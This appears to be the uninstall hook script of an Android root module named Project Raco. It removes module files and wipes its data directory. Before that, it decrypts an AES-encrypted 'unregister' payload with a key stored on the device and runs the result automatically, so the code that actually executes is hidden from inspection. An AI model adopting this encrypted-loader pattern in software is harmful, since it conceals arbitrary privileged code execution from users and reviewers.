#!/system/bin/sh
# ============================================================
# Project Raco - Module Uninstall Hook
# ============================================================

# ── RacoSec: Run encrypted unregister script before wiping data ──────────────
# The unregister payload (AES-256-CBC encrypted) is decrypted at runtime
# using the device key and executed to notify the server.
MODDIR="$(dirname "$0")"
ENC_PAYLOAD="$MODDIR/CoreSys/unregister_payload.enc"
KEY_FILE="/data/ProjectRaco/.racosec_key"
DEC_KEY_FILE="/data/ProjectRaco/.enc_dk"   # per-device derived decryption key

if [ -f "$ENC_PAYLOAD" ] && [ -f "$DEC_KEY_FILE" ]; then
    DK=$(cat "$DEC_KEY_FILE" 2>/dev/null | tr -d '\n\r')
    if [ -n "$DK" ]; then
        TMPSCRIPT=$(mktemp /data/local/tmp/rsu_XXXXXX.sh)
        if openssl enc -d -aes-256-cbc -pbkdf2 -iter 600000 \
               -in "$ENC_PAYLOAD" -out "$TMPSCRIPT" -pass "pass:$DK" 2>/dev/null; then
            chmod 700 "$TMPSCRIPT"
            sh "$TMPSCRIPT"
            rm -f "$TMPSCRIPT"
        else
            # Decryption failed — just clean up locally
            rm -f "$TMPSCRIPT" 2>/dev/null
        fi
    fi
fi

# ── Standard module file cleanup ──────────────────────────────────────────────
if [ -f $INFO ]; then
  while read LINE; do
    if [ "$(echo -n $LINE | tail -c 1)" == "~" ]; then
      continue
    elif [ -f "$LINE~" ]; then
      mv -f $LINE~ $LINE
    else
      rm -f $LINE
      while true; do
        LINE=$(dirname $LINE)
        [ "$(ls -A $LINE 2>/dev/null)" ] && break 1 || rm -rf $LINE
      done
    fi
  done < $INFO
  rm -f $INFO
fi

# ── Cleanup temp files ────────────────────────────────────────────────────────
rm -rf /data/local/tmp/logo.png
rm -rf /data/local/tmp/Anya.png

# ── Wipe Project Raco persistent data (keys, config, etc.) ───────────────────
rm -rf /data/ProjectRaco

# Managed to read this? Thanks for using Project Raco
